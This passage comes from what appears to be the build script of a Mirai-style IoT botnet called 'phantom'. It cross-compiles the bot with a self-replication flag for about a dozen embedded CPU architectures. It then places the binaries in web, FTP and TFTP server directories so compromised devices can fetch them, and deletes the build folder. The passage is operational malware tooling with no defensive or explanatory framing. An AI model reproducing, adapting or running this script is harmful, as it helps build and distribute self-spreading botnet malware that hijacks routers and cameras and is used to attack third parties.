...
compile_bot i586 phantom.x86 "-static -DSELFREP"
compile_bot mips phantom.mips "-static -DSELFREP"
compile_bot mipsel phantom.mpsl "-static -DSELFREP"
compile_bot armv4l phantom.arm "-static -DSELFREP"
compile_bot armv5l phantom.arm5 "-DSELFREP"
compile_bot armv6l phantom.arm6 "-static -DSELFREP"
compile_bot armv7l phantom.arm7 "-static -DSELFREP"
compile_bot powerpc phantom.ppc "-static -DSELFREP"
compile_bot sparc phantom.spc "-static -DSELFREP"
compile_bot m68k phantom.m68k "-static -DSELFREP"
compile_bot sh4 phantom.sh4 "-static -DSELFREP"

cp release/phantom.* /var/www/html/bins
cp release/phantom.* /var/ftp
mv release/phantom.* /var/lib/tftpboot
rm -rf release
